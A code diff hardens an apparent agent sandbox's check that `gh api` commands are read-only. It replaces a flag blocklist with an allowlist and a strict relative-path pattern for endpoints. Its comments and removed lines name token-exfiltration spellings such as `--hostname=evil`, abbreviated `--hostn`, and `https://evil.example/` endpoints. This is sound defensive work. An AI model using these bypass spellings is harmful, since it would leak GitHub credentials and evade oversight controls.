@@ -222,9 +222,19 @@ _GH_READ_VERBS = {
     ("workflow", "view"),
     ("issue", "view"),
 }
-_GH_API_WRITE_FLAGS = ("--field", "--raw-field", "--input", "--header", "--cache")
-_GH_API_WRITE_SHORT_FLAGS = ("-f", "-F", "-H")
-_GH_API_EXFIL_FLAGS = ("--hostname", "--gh-hostname")
+# F-01: token-skip flags whose argument carries the HTTP method. (`--hostname`
+# / `--gh-hostname` redirect the OAuth token to an attacker host; they are not
+# allowlisted below, so every spelling fails closed.)
+_GH_API_METHOD_FLAGS = ("--method", "-x")
+# F-01/F-02: option handling is allowlist-based. pflag/cobra accepts inline
+# `=` spellings (`--hostname=evil`) and unambiguous prefix abbreviations
+# (`--hostn evil`), so a blocklist on exact flag names can be bypassed. Only
+# these read-safe option forms are accepted; every other option fails closed.
+_GH_API_SAFE_FLAGS = {"--paginate", "--include", "-i"}
+# F-02: a read-only endpoint must be a relative GitHub REST path — lowercase
+# alphanumeric segments joined by slashes (optionally with a leading slash).
+# Schemes (`https://...`), hosts, and any other character fail closed.
+_GH_API_ENDPOINT_PATH = re.compile(r"/?[a-z0-9._-]+(?:/[a-z0-9._-]+)*")
 # Background jobs (`cmd &`) and unconditional chaining would otherwise
 # hide a second command behind a read-only first stage; fd duplication
 # like `2>&1` is handled by the redirect scanner, not matched here.
@@ -241,39 +251,54 @@ def _program_name(token: str) -> str:
 
 
 def _gh_api_is_read_only(args: list[str]) -> bool:
-    """Allow REST GET probes only; GraphQL and payload/header flags fail closed."""
+    """Allow REST GET probes only; anything unrecognized fails closed.
+
+    F-01: option handling is allowlist-based. pflag/cobra accepts inline
+    `--flag=VALUE` spellings and unambiguous prefix abbreviations (`--hostn`),
+    so matching only exact flag names missed every `=`/abbreviated spelling of
+    `--hostname`. Here every option token must be a known read-safe form
+    (`--paginate`, `--include`, `-i`, or the method selectors) before the
+    command can be read-only; `--hostname`, `--field`, `--input`, and every
+    unknown option fall closed.
+    """
     method = "GET"
     endpoint: str | None = None
     index = 0
     while index < len(args):
         raw = _clean_shell_token(args[index])
         lowered = raw.lower()
-        if lowered in {"--method", "-x"}:
+        if lowered in _GH_API_METHOD_FLAGS or lowered.startswith("--method=") or (
+            lowered.startswith("-x") and len(raw) > 2
+        ):
+            if lowered.startswith(("--method=", "-x")):
+                method = raw.split("=", 1)[1].upper() if "=" in raw else raw[2:].upper()
+                index += 1
+                continue
             if index + 1 >= len(args):
                 return False
             method = _clean_shell_token(args[index + 1]).upper()
             index += 2
             continue
-        if lowered.startswith("--method="):
-            method = raw.split("=", 1)[1].upper()
+        if raw in _GH_API_SAFE_FLAGS or lowered in _GH_API_SAFE_FLAGS:
             index += 1
             continue
-        if lowered.startswith("-x") and len(raw) > 2:
-            method = raw[2:].upper()
-            index += 1
-            continue
-        if lowered in _GH_API_WRITE_FLAGS or raw in _GH_API_WRITE_SHORT_FLAGS:
+        if raw.startswith("-"):
+            # Any other option spelling fails closed: write/payload flags
+            # (`--field`, `--raw-field`, `--input`, `--header`, `--cache`,
+            # `-f`, `-F`, `-H`), host overrides (`--hostname[=...]`,
+            # `--gh-hostname[=...]`, abbreviations like `--hostn evil`),
+            # template and jq selectors, and anything not allowlisted.
             return False
-        if lowered in _GH_API_EXFIL_FLAGS:
-            return False
-        if any(lowered.startswith(flag + "=") for flag in _GH_API_WRITE_FLAGS):
-            return False
-        if any(raw.startswith(flag) and len(raw) > len(flag) for flag in _GH_API_WRITE_SHORT_FLAGS):
-            return False
-        if not raw.startswith("-") and endpoint is None:
+        if endpoint is None:
             endpoint = lowered
         index += 1
-    return bool(endpoint) and endpoint != "graphql" and method == "GET"
+    if endpoint is None or endpoint == "graphql" or method != "GET":
+        return False
+    # F-02: the endpoint must be a relative REST path (`repos/o/r`,
+    # `/user/repos`). Absolute URLs would let `gh api https://evil.example/...`
+    # inherit the read lane, so any scheme or foreign-host spelling fails
+    # closed against a strict path allowlist.
+    return _GH_API_ENDPOINT_PATH.fullmatch(endpoint) is not None
 
 
 def _gh_stage_is_read_only(tokens: list[str]) -> bool:
